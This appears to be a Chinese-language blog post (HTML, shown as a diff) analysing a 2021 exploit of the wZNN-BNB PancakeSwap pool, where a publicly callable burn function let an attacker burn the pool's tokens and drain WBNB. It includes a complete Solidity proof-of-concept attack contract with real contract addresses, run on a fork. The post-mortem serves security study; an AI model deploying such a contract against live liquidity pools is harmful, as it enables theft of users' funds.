@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>智能合约安全审计第一步：向“public burn”说no！ | SCS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="复盘分析、合约设计漏洞、函数权限" />
+  
+  
+  
+  
+  <meta name="description" content="流动性池与自动做市商是在DeFi的核心概念例如，现在有一个流动性池，里面有100个以太币，假设现在每个以太币值100美元，以太币的价值在10000美元；里面还有10000个USDT，也值10000美元，总共池子的资金加起来是20000美元。这个池子就能提供流动性了。池子里面以太币和USDT的价值比为1：1，既能以太换USDT，又能USDT换以太币。一般来说流动性池初始时的价值比，就是1：1 现在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约安全审计第一步：向“public burn”说NO！">
+<meta property="og:url" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/index.html">
+<meta property="og:site_name" content="SCS">
+<meta property="og:description" content="流动性池与自动做市商是在DeFi的核心概念例如，现在有一个流动性池，里面有100个以太币，假设现在每个以太币值100美元，以太币的价值在10000美元；里面还有10000个USDT，也值10000美元，总共池子的资金加起来是20000美元。这个池子就能提供流动性了。池子里面以太币和USDT的价值比为1：1，既能以太换USDT，又能USDT换以太币。一般来说流动性池初始时的价值比，就是1：1 现在">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_18-07-53.png">
+<meta property="og:image" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_22-23-36.png">
+<meta property="og:image" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_22-43-28.png">
+<meta property="og:image" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-27_21-38-19.png">
+<meta property="article:published_time" content="2022-03-27T02:42:40.000Z">
+<meta property="article:modified_time" content="2022-03-27T14:05:54.236Z">
+<meta property="article:author" content="Janson Woods">
+<meta property="article:tag" content="复盘分析、合约设计漏洞、函数权限">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_18-07-53.png">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-智能合约安全审计第一课：向“public burn”说NO！" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      智能合约安全审计第一步：向“public burn”说NO！
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/" class="article-date">
+	  <time datetime="2022-03-27T02:42:40.000Z" itemprop="datePublished">2022-03-27</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_18-07-53.png" alt="Snipaste_2022-03-23_18-07-53"></p>
+<h2 id="流动性池与自动做市商是在DeFi的核心概念"><a href="#流动性池与自动做市商是在DeFi的核心概念" class="headerlink" title="流动性池与自动做市商是在DeFi的核心概念"></a>流动性池与自动做市商是在DeFi的核心概念</h2><p>例如，现在有一个流动性池，里面有100个以太币，假设现在每个以太币值100美元，以太币的价值在10000美元；里面还有10000个USDT，也值10000美元，总共池子的资金加起来是20000美元。这个池子就能提供流动性了。池子里面以太币和USDT的价值比为1：1，既能以太换USDT，又能USDT换以太币。一般来说流动性池初始时的价值比，就是1：1</p>
+<p>现在我要从这个池子里用USDT换10个以太币，这个时候该怎么确定价格呢？或者说，我应该放入多少个USDT来换呢？这是由自动做市商的规则（UniswapV1及仿生品均使用常数乘机）决定。</p>
+<p>但是当代币合约的代码出现“public burn”问题，会导致价值差巨大的不平等swap！</p>
+<h2 id="案例说明"><a href="#案例说明" class="headerlink" title="案例说明"></a>案例说明</h2><p>PancakeSwap V2: wZNN <a href="0xa6744c5065e778B47a9ab4Ce1E2dC4A6b489effA">**</a>是PancakeSwap上Wrapped ZNN (wZNN)](<a target="_blank" rel="noopener" href="https://bscscan.com/token/0x8a7ca49f42e5196c26bb00fa014352e5d065db4d)%E5%92%8CBNB%E7%9A%84%E4%BA%A4%E6%98%93%E5%AF%B9%E5%90%88%E7%BA%A6%EF%BC%8C%E4%B8%BB%E8%A6%81%E8%B4%9F%E8%B4%A3wZNN%E5%92%8CBNB%E7%9A%84swap%E5%8A%9F%E8%83%BD%E4%BB%A5%E5%8F%8A%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%EF%BC%8C%E6%98%AFwZNN-BNB%E4%BA%A4%E6%98%93%E5%AF%B9%E7%9A%84%E6%B5%81%E5%8A%A8%E6%B1%A0%E3%80%82">https://bscscan.com/token/0x8a7ca49f42e5196c26bb00fa014352e5d065db4d)和BNB的交易对合约，主要负责wZNN和BNB的swap功能以及资金管理，是wZNN-BNB交易对的流动池。</a></p>
+<p>2021年11月份的一笔攻击（0xc14ae484b49a346fca9bb414e302c6a9ad0e16fc085c8e197ac7ae85df5727fc）将整个池子的流动性消耗殆尽，攻击的原理就在于wZNN代币合约的burn函数的权限设置有误，导致可以随意的销毁某个流动池中的wZNN代币，将池子中wZNN代币价格瞬间拉高。</p>
+<p><img src="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_22-23-36.png" alt="Snipaste_2022-03-23_22-23-36"></p>
+<h3 id="攻击原理分析"><a href="#攻击原理分析" class="headerlink" title="攻击原理分析"></a>攻击原理分析</h3><p><img src="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-23_22-43-28.png" alt="Snipaste_2022-03-23_22-43-28"></p>
+<p>攻击者在第二步调用wZNN的由public修饰的burn函数，将wZNN-BNB交易池中的wZNN代币消耗到一个极少的数量，目的在于利用自动做市商恒定乘机的规则获得大量的WBNB，完成获利。</p>
+<p>建议多使用标准的智能合约库的函数功能，在进行函数功能设计时应多考虑函数的权限的设定，合约开发者应熟知DeFi的自动做市商、流动性池等安全开发的经验。</p>
+<h3 id="攻击复现POC：fork高度为12806373"><a href="#攻击复现POC：fork高度为12806373" class="headerlink" title="攻击复现POC：fork高度为12806373"></a>攻击复现POC：fork高度为12806373</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface Router &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 amountIn,</span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 amountOutMin,</span></span></span><br><span class="line"><span class="params"><span class="function">        address[] memory path,</span></span></span><br><span class="line"><span class="params"><span class="function">        address to,</span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 deadline</span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) <span class="title">external</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface WBNB &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address guy, uint256 wad</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface wZNN &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 amount</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">burn</span>(<span class="params">address account, uint256 amount</span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address account</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Pair &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sync</span>(<span class="params"></span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line"></span><br><span class="line">    address wbnb = <span class="number">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>;</span><br><span class="line">    address wznn = <span class="number">0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d</span>;</span><br><span class="line">    address pair = <span class="number">0xa6744c5065e778B47a9ab4Ce1E2dC4A6b489effA</span>;</span><br><span class="line">    address router = <span class="number">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        WBNB(wbnb).approve(router,type(uint256).max);</span><br><span class="line">        wZNN(wznn).approve(router,type(uint256).max);</span><br><span class="line">        WBNB(wbnb).approve(pair,type(uint256).max);</span><br><span class="line">        wZNN(wznn).approve(pair,type(uint256).max);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Get WBNB&quot;</span>);</span><br><span class="line">        WBNB(wbnb).deposit&#123;<span class="attr">value</span>:<span class="number">1000000000000000000</span>,<span class="attr">gas</span>:<span class="number">40000</span>&#125;();</span><br><span class="line">        uint bnb_amount = <span class="number">0.001</span> ether;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;1.swap wZNN&quot;</span>);</span><br><span class="line">         <span class="comment">//    生成swap WBNB-&gt;wZNN 的路径数组</span></span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="number">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>;</span><br><span class="line">        path[<span class="number">1</span>] = <span class="number">0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d</span>;</span><br><span class="line">        Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(bnb_amount,<span class="number">0</span>,path,address(<span class="built_in">this</span>),block.timestamp);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;2.burn wZNN&quot;</span>);</span><br><span class="line">        wZNN(wznn).burn(pair,<span class="number">2646845010027</span>);</span><br><span class="line">        Pair(pair).sync();</span><br><span class="line">        uint attacker_wznn_balance = wZNN(wznn).balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line">        wZNN(wznn).approve(router,type(uint256).max);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;3.expolit&quot;</span>);</span><br><span class="line">         <span class="comment">//    生成swap wZNN -&gt; WBNB 的路径数组</span></span><br><span class="line">        <span class="comment">// address[] memory path = new address[](2);</span></span><br><span class="line">        path[<span class="number">1</span>] = <span class="number">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>;</span><br><span class="line">        path[<span class="number">0</span>] = <span class="number">0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d</span>;</span><br><span class="line"></span><br><span class="line">        Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(attacker_wznn_balance,<span class="number">0</span>,path,address(<span class="built_in">this</span>),block.timestamp);</span><br><span class="line">        uint attacker_balance_Wbnb = WBNB(wbnb).balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Finish attacking,Attacker WBNB balance:&quot;</span>,attacker_balance_Wbnb / <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   receive() payable external&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现结果："><a href="#复现结果：" class="headerlink" title="复现结果："></a>复现结果：</h3><p><img src="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%90%91%E2%80%9Cpublic%20burn%E2%80%9D%E8%AF%B4NO%EF%BC%81/public_burn%E4%B8%93%E9%A2%98%E5%88%86%E6%9E%90%5CSnipaste_2022-03-27_21-38-19.png" alt="Snipaste_2022-03-27_21-38-19"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>Janson Woods</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2022/03/27/智能合约安全审计第一课：向“public burn”说NO！/" target="_blank" title="智能合约安全审计第一步：向“public burn”说NO！">http://example.com/2022/03/27/智能合约安全审计第一课：向“public burn”说NO！/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%90%88%E7%BA%A6%E8%AE%BE%E8%AE%A1%E6%BC%8F%E6%B4%9E%E3%80%81%E5%87%BD%E6%95%B0%E6%9D%83%E9%99%90/" rel="tag">复盘分析、合约设计漏洞、函数权限</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/12/12/MONO%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">MONO攻击--价格计算被利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E5%8A%A8%E6%80%A7%E6%B1%A0%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%81%9A%E5%B8%82%E5%95%86%E6%98%AF%E5%9C%A8DeFi%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="nav-number">1.</span> <span class="nav-text">流动性池与自动做市商是在DeFi的核心概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E8%AF%B4%E6%98%8E"><span class="nav-number">2.</span> <span class="nav-text">案例说明</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">攻击原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0POC%EF%BC%9Afork%E9%AB%98%E5%BA%A6%E4%B8%BA12806373"><span class="nav-number">2.2.</span> <span class="nav-text">攻击复现POC：fork高度为12806373</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">复现结果：</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2022 SCS All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
